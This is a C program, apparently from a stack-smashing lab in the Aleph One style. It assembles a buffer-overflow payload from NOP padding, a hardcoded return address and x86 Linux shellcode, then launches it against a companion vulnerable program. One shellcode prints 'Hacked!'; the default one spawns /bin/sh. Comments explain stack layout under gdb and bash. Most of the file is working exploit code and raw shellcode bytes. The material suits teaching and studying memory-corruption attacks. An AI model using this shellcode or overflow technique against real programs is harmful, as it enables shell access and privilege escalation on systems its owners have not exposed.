#include <string.h>

#define NOP 0x90

char print_hacked[] = "\xeb\x14"      // jmp    8048076 <_start+0x16>
    "\x31\xc0"                        // xor    %eax,%eax
    "\xb0\x04"                        // mov    $0x4,%al
    "\x31\xdb"                        // xor    %ebx,%ebx
    "\x43"                            // inc    %ebx
    "\x59"                            // pop    %ecx
    "\x31\xd2"                        // xor    %edx,%edx
    "\xb2\x07"                        // mov    $0x7,%dl
    "\xcd\x80"                        // int    $0x80
    "\x31\xc0"                        // xor    %eax,%eax
    "\xb0\x01"                        // mov    $0x1,%al
    "\xcd\x80"                        // int    $0x80
    "\xe8\xe7\xff\xff\xff"            // call   8048062 <_start+0x2>
    "Hacked!";

char spawn_shell[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
    "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
    "\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

/** 
    Address is in the Little Endian format

    Regular execution:
    ------------------------------------
    | Stack of the vulnerable program, |
    | in this case attackable.c        |
    ------------------------------------
    
    The address of the buffer changes if the program is executed from gdb or from a new bash. Why?

    Execution from GDB:
    -------------------------------------------
    | Stack of the vulnerable program,| GDB's |
    | in this case attackable.c       | stack |
    -------------------------------------------
    
    Execution from a new bash:
    --------------------------------------------
    | Stack of the vulnerable program,| bash's |
    | in this case attackable.c       | stack  |
    --------------------------------------------

**/

int main(int argc, char **argv) {

    /**
        Buffer of attackable.c, the stack diagram can be found in attackable.c
        Content with which attackable.c's buffer will be overwritten
        -----------------------------------------------
        | Shellcode padded      | PTR to shell        |
        | with NOP - 92 bytes   | code - 4 bytes      |
        -----------------------------------------------
    **/

    // Address of the buffer being overflowed.
    char retaddr[] = "\xb0\xfd\xff\xbf";
    char shellcode[96];
    // Fill the buffer with NOP instructions
    memset(shellcode, NOP, sizeof(shellcode));
    printf("Shellcode: %s\n", shellcode);
    char choice = '0';
    if (argc >= 2) {
        choice = argv[1][0]; 
    }
    switch(choice) {
        case '1': 
            memcpy(shellcode, print_hacked, strlen(print_hacked));
            break;
        default: 
            memcpy(shellcode, spawn_shell, strlen(spawn_shell));
    }
    printf("Shellcode: %s\n", shellcode);
    memcpy(shellcode+92, retaddr, 4);
    printf("Shellcode: %s\n", shellcode);

    // Test the shellcode
    char *arg[] = {"bin/aleph_one/attackable", shellcode, NULL};
    execve("bin/aleph_one/attackable", arg, NULL);

    return 0;
}